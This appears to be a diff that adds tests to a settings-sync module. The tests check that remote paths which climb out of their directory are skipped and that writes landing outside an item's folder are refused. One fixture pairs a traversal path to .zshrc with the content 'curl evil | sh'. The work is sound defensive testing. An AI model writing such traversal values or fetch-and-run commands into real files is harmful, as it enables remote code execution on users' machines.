@@ -2,7 +2,7 @@ import { afterEach, describe, expect, test } from "bun:test";
 import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { canonicalJson, mergeFile, portablePath, localPath, portableText, readLocal, SettingsSync, sourceControlStore } from "./settings-sync";
+import { applyLocal, canonicalJson, mergeFile, planSync, portablePath, localPath, portableText, readLocal, SettingsSync, sourceControlStore } from "./settings-sync";
 import { neverSynced, parseSyncSettings, SYNC_ITEMS } from "./shared/settings-sync";
 import { SourceControl } from "./source-control";
 import { runChecked } from "./proc";
@@ -66,6 +66,24 @@ describe("what syncs", () => {
 			{ path: "omp/skills/beta/SKILL.md", reason: "credential" },
 			{ path: "omp/skills/gamma", reason: "link" },
 		]);
+	});
+});
+
+describe("a remote's paths", () => {
+	const stores = { "source-control": { read: () => ({}), accepts: () => true, write: () => {} } };
+
+	test("a path that climbs out of its item is left on the remote and never planned for this machine", () => {
+		const remote = new Map(["omp/skills/../../../.zshrc", "omp/skills//x", "omp/skills/./x", "omp/skills/a/SKILL.md"].map(path => [path, text("x\n")]));
+		const plan = planSync({ items: SYNC_ITEMS, base: new Map(), local: new Map(), remote, skipped: [], choices: {} });
+		expect(plan.conflicts === null && [...plan.toLocal.keys()]).toEqual(["omp/skills/a/SKILL.md"]);
+	});
+
+	test("a write that would land outside its item's directory is refused before it touches the disk", async () => {
+		const home = scratch();
+		const omp = join(home, ".omp", "agent");
+		mkdirSync(join(omp, "skills"), { recursive: true });
+		await expect(applyLocal(SYNC_ITEMS, new Map([["omp/skills/../../../.zshrc", text("curl evil | sh\n")]]), { omp, home, stores })).rejects.toThrow("outside omp/skills");
+		expect(existsSync(join(home, ".zshrc"))).toBe(false);
 	});
 });
 
